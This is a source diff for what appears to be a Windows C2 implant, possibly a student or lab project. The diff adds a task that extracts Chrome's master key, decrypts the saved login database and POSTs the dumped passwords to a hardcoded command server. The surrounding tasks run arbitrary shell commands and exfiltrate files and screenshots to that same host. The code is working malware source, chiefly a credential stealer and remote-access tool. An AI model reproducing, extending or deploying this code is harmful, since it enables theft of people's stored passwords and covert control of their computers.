@@ -4,6 +4,7 @@
 
 #include "tasks.h"
 #include "base64.h"
+#include "PasswordDumper.h"
 
 #include <cpr/cpr.h>
 #include <nlohmann/json.hpp>
@@ -14,9 +15,14 @@
 #include <Shlwapi.h>
 #include <GdiPlus.h>
 
+#include <io.h>
+#include <fcntl.h>
+
 using json = nlohmann::json;
 
 extern std::string ids;
+extern DATA_BLOB GlobalBlob;
+
 // Function to parse the tasks from the property tree returned by the listening post
 // Execute each task according to the key specified (e.g. Got task_type of "ping"? Run the PingTask)
 [[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
@@ -80,6 +86,11 @@ extern std::string ids;
             ids
         };
     }
+    if (taskType == DumpBrowserPasswordsTask::key && idString == ids) {
+        return DumpBrowserPasswordsTask{
+            ids
+        };
+    }
 
     // ===========================================================================================
 
@@ -122,7 +133,7 @@ PingTask::PingTask(const std::string& id)
     : id{ id } {}
 
 Result PingTask::run() const {
-    const auto pingResult = "PONG!";
+    const auto pingResult = L"PONG!";
     return Result{ id, pingResult, true };
 }
 
@@ -141,7 +152,7 @@ ConfigureTask::ConfigureTask(const std::string& id,
 Result ConfigureTask::run() const {
     // Call setter to set the implant configuration, mean dwell time and running status
     setter(Configuration{ meanDwell, isRunning });
-    return Result{ id, "Configuration successful!", true };
+    return Result{ id, L"Configuration successful!", true };
 }
 
 
@@ -152,22 +163,27 @@ ExecuteTask::ExecuteTask(const std::string& id, std::string command)
     command{ std::move(command) } {}
 
 Result ExecuteTask::run() const {
-    std::string result;
+    std::wstring result;
     try {
-        std::array<char, 128> buffer{};
+        fflush(stdout); 
+        _setmode(_fileno(stdout), _O_U16TEXT);
+        std::array<wchar_t, 128> buffer{};
         std::unique_ptr<FILE, decltype(&_pclose)> pipe{
             _popen(command.c_str(), "r"),
             _pclose
         };
         if (!pipe)
             throw std::runtime_error("Failed to open pipe.");
-        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+        while (fgetws(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
             result += buffer.data();
         }
+        //std::string result2(result.begin(), result.end()); // UNICODE PROBLEMSSSSS
         return Result{ id, std::move(result), true };
     }
     catch (const std::exception& e) {
-        return Result{ id, e.what(), false };
+        std::string e2 = e.what();
+        std::wstring e3(e2.begin(), e2.end());
+        return Result{ id, e3, false };
     }
 }
 
@@ -179,7 +195,7 @@ ListThreadsTask::ListThreadsTask(const std::string& id, std::string processId)
 
 Result ListThreadsTask::run() const {
     try {
-        std::stringstream threadList;
+        std::wstringstream threadList;
         auto ownerProcessId{ 0 };
 
         // User wants to list threads in current process
@@ -192,7 +208,7 @@ Result ListThreadsTask::run() const {
         }
         // Some invalid process ID was provided, throw an error
         else {
-            return Result{ id, "Error! Failed to handle given process ID.", false };
+            return Result{ id, L"Error! Failed to handle given process ID.", false };
         }
 
         HANDLE threadSnap = INVALID_HANDLE_VALUE;
@@ -201,7 +217,7 @@ Result ListThreadsTask::run() const {
         // Take a snapshot of all running threads
         threadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
         if (threadSnap == INVALID_HANDLE_VALUE)
-            return Result{ id, "Error! Could not take a snapshot of all running threads.", false };
+            return Result{ id, L"Error! Could not take a snapshot of all running threads.", false };
 
         // Fill in the size of the structure before using it. 
         te32.dwSize = sizeof(THREADENTRY32);
@@ -211,7 +227,7 @@ Result ListThreadsTask::run() const {
         if (!Thread32First(threadSnap, &te32))
         {
             CloseHandle(threadSnap);     // Must clean up the snapshot object!
-            return Result{ id, "Error! Could not retrieve information about first thread.", false };
+            return Result{ id, L"Error! Could not retrieve information about first thread.", false };
         }
 
         // Now walk the thread list of the system,
@@ -222,7 +238,7 @@ Result ListThreadsTask::run() const {
             if (te32.th32OwnerProcessID == ownerProcessId)
             {
                 // Add all thread IDs to a string stream
-                threadList << "THREAD ID      = " << te32.th32ThreadID << "\n";
+                threadList << L"THREAD ID      = " << te32.th32ThreadID << "\n";
             }
         } while (Thread32Next(threadSnap, &te32));
 
@@ -232,7 +248,9 @@ Result ListThreadsTask::run() const {
         return Result{ id, threadList.str(), true };
     }
     catch (const std::exception& e) {
-        return Result{ id, e.what(), false };
+        std::string e2 = e.what();
+        std::wstring e3(e2.begin(), e2.end());
+        return Result{ id, e3, false };
     }
 }
 
@@ -249,7 +267,9 @@ Result KillBeaconProcess::run() const {
         TerminateProcess(hProcess, 0);
     }
     catch (const std::exception& e) {
-        return Result{ id, e.what(), false };
+        std::string e2 = e.what();
+        std::wstring e3(e2.begin(), e2.end());
+        return Result{ id, e3, false };
     }
 }
 
@@ -260,7 +280,7 @@ ListRunningProcesses::ListRunningProcesses(const std::string& id)
 
 Result ListRunningProcesses::run() const {
     try {
-        std::stringstream processList;
+        std::wstringstream processList;
 
         HANDLE hProcessSnap, hProcess;
         PROCESSENTRY32 pe32;
@@ -270,7 +290,7 @@ Result ListRunningProcesses::run() const {
         hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (hProcessSnap == INVALID_HANDLE_VALUE)
         {
-            return Result{ id, "Error! Could not take a snapshot of all running processes.", false };
+            return Result{ id, L"Error! Could not take a snapshot of all running processes.", false };
         }
 
         // Set the size of the structure before using it.
@@ -281,40 +301,41 @@ Result ListRunningProcesses::run() const {
         if (!Process32FirstW(hProcessSnap, &pe32))
         {
             CloseHandle(hProcessSnap);          // clean the snapshot object
-            return Result{ id, "Error! Could not retrieve information about first process.", false };
+            return Result{ id, L"Error! Could not retrieve information about first process.", false };
         }
 
         // Now walk the snapshot of processes, and
         // display information about each process in turn
-        std::string processIsAdmin;
+        std::wstring processIsAdmin;
         processList
-            << "=========================================\n";
+            << L"=========================================\n";
         do
         {
             // STUPID CONVERSION FROM WCHAR TO ASCII STRING!!!!
-            std::wstring ws(pe32.szExeFile);
-            std::string process_name(ws.begin(), ws.end());
+            std::wstring process_name(pe32.szExeFile);
             hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
             bRunAsAdmin = IsRunasAdmin(hProcess);
             if (bRunAsAdmin)
-                processIsAdmin = "Yes";
+                processIsAdmin = L"Yes";
             else
-                processIsAdmin = "?";
+                processIsAdmin = L"?";
 
             processList
-                << "[+] Process-Name:  " << process_name
-                << "    PID: " << pe32.th32ProcessID
-                << "    Elevated:  " << processIsAdmin << "\n";
+                << L"[+] Process-Name:  " << process_name
+                << L"    PID: " << pe32.th32ProcessID
+                << L"    Elevated:  " << processIsAdmin << "\n";
 
         } while (Process32NextW(hProcessSnap, &pe32));
 
-        processList << "=========================================\n";
+        processList << L"=========================================\n";
  
         CloseHandle(hProcessSnap);
         return Result{ id, processList.str(), true };
     }
     catch (const std::exception& e) {
-        return Result{ id, e.what(), false };
+        std::string e2 = e.what();
+        std::wstring e3(e2.begin(), e2.end());
+        return Result{ id, e3, false };
     }
 }
 
@@ -332,19 +353,19 @@ Result DownloadFileTask::run() const {
         std::string base_filename = path.substr(path.find_last_of("/\\") + 1);
 
         std::stringstream ss;
-        ss << "http://192.168.1.3:5000/files/" << base_filename;
+        ss << "http://192.168.1.10:5000/files/" << base_filename;
         std::string fullServerUrl = ss.str();
         cpr::Response r = cpr::Post(cpr::Url{ fullServerUrl }, cpr::Multipart{ {"Filedata", cpr::File{filepath}}});
 
         if (r.status_code == 201) { // checks if the request has return 201 CREATED
-            return Result{ id, "File Download Successful!", true};
+            return Result{ id, L"File Download Successful!", true};
         }
         else {
-            return Result{ id, "File Download Failed!", false };
+            return Result{ id, L"File Download Failed!", false };
         }
     }
     else {
-        return Result{ id, "File Doesn't Exists!", false };
+        return Result{ id, L"File Doesn't Exists!", false };
     }
 }
 
@@ -359,14 +380,14 @@ Result UploadFileTask::run() const {
 
     std::ofstream of(filename, std::ios::binary);
     std::stringstream ss;
-    ss << "http://192.168.1.3:5000/files/" << filename;
+    ss << "http://192.168.1.10:5000/files/" << filename;
     std::string fullServerUrl = ss.str();
     cpr::Response r = cpr::Download(of, cpr::Url{ fullServerUrl });
     if (r.status_code == 200) { // checks if the file has been downloaded successfully by the implant
-        return Result{ id, "File Successfully Uploaded!", true };
+        return Result{ id, L"File Successfully Uploaded!", true };
     }
     else {
-        return Result{ id, "File Upload Failed!", false };
+        return Result{ id, L"File Upload Failed!", false };
     }
 }
 
@@ -443,7 +464,7 @@ Result ScreenshotTask::run() const {
     std::string file = base64_encode(std::string(buf.begin(), buf.end()));
 
     std::stringstream ss;
-    ss << "http://192.168.1.3:5000/screenshots";
+    ss << "http://192.168.1.10:5000/screenshots";
     std::string fullServerUrl = ss.str();
 
     json bodyrequest;
@@ -457,9 +478,124 @@ Result ScreenshotTask::run() const {
     );
 
     if (r.status_code == 200) { // checks if the request has return 200
-        return Result{ id, "Screenshot Successful!", true };
+        return Result{ id, L"Screenshot Successful!", true };
     }
     else {
-        return Result{ id, "Screenshot Failed!", false };
+        return Result{ id, L"Screenshot Failed!", false };
     }
+}
+
+// DumpBrowserPasswordsTask (Dumps every password that was saved in Chrome Browser)
+// -------------------------------------------------------------------------------------------
+DumpBrowserPasswordsTask::DumpBrowserPasswordsTask(const std::string& id)
+    : id{ id } {}
+
+Result DumpBrowserPasswordsTask::run() const {
+    DWORD dwError = ERROR_SUCCESS;
+    WCHAR ChromePath[WMAX_PATH] = { 0 };
+    BOOL bExists = FALSE;
+    WCHAR Tmp[WMAX_PATH] = { 0 };
+
+    TCHAR path[MAX_PATH] = { 0 };
+
+    GetCurrentDirectory(MAX_PATH, path);
+
+    int size_needed;
+    char* stringMe;
+    std::string filepath;
+    std::stringstream ss;
+    cpr::Response r;
+
+    ss << "http://192.168.1.10:5000/files/Log.txt";
+    std::string fullServerUrl = ss.str();
+
+    typedef enum { Chrome = 0, FireFox = 1, Other = 2 } BrowserTargets;
+
+    if (!CreateLocalAppDataObjectPath(ChromePath, (PWCHAR)L"\\Google\\Chrome\\User Data\\Local State", WMAX_PATH, TRUE))
+    {
+        goto FAILURE;
+    }
+
+    if (!RtlGetMasterKey(ChromePath)) 
+    {
+        goto FAILURE;
+    }
+
+    DisposeOfPathObject(ChromePath);
+
+    if (!CreateLocalAppDataObjectPath(ChromePath, (PWCHAR)L"\\Google\\Chrome\\User Data\\Default\\Login Data", WMAX_PATH, TRUE))
+    {
+        goto FAILURE;
+    }
+
+    if (!CreateLocalAppDataObjectPath(Tmp, (PWCHAR)L"\\Google\\Chrome\\User Data\\Default\\", WMAX_PATH, FALSE))
+    {
+        goto FAILURE;
+    }
+
+    if (!SetCurrentDirectoryW(Tmp))
+    {
+        goto FAILURE;
+    }
+
+    size_needed = WideCharToMultiByte(CP_UTF8, 0, Tmp, -1, NULL, 0, NULL, NULL);
+    stringMe = new char[size_needed + 1];
+    WideCharToMultiByte(CP_UTF8, 0, Tmp, -1, stringMe, size_needed, NULL, NULL);
+    stringMe[size_needed + 1] = NULL;
+
+    filepath = stringMe;
+    filepath += "Log.txt";
+
+    DisposeOfPathObject(Tmp);
+
+    if (!CopyFile(ChromePath, DB_STRING, TRUE))
+        goto FAILURE;
+
+    bExists = TRUE;
+
+    if (!GetSqlite3ChromeDbData())
+        goto FAILURE;
+
+    if (!DeleteFileInternal((PWCHAR)DB_STRING))
+        goto FAILURE;
+
+    if (GlobalBlob.pbData)
+        HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, GlobalBlob.pbData);
+
+    r = cpr::Post(cpr::Url{ fullServerUrl }, cpr::Multipart{ {"Filedata", cpr::File{filepath}} });
+
+    if (r.status_code == 201) { // checks if the request has return 201 CREATED
+        if (!DeleteFileInternal((PWCHAR)LOG_FILE)) {
+            goto FAILURE;
+        }
+        if (!SetCurrentDirectoryW(path))
+        {
+            goto FAILURE;
+        }
+        return Result{ id, L"Browser Dump Successful!", true };
+    }
+    else {
+        if (!DeleteFileInternal((PWCHAR)LOG_FILE)) {
+            goto FAILURE;
+        }
+        return Result{ id, L"File Download Failed!", false };
+    }
+
+FAILURE:
+    std::ostringstream stream;
+
+    dwError = GetLastError();
+
+    if (bExists) {
+        DeleteFileInternal((PWCHAR)DB_STRING);
+        DeleteFileInternal((PWCHAR)LOG_FILE);
+    }
+
+    if (GlobalBlob.pbData)
+        HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, GlobalBlob.pbData);
+
+    stream << dwError;
+    std::string e2 = stream.str();
+    std::wstring e3(e2.begin(), e2.end());
+    return Result{ id, e3, false };
 }
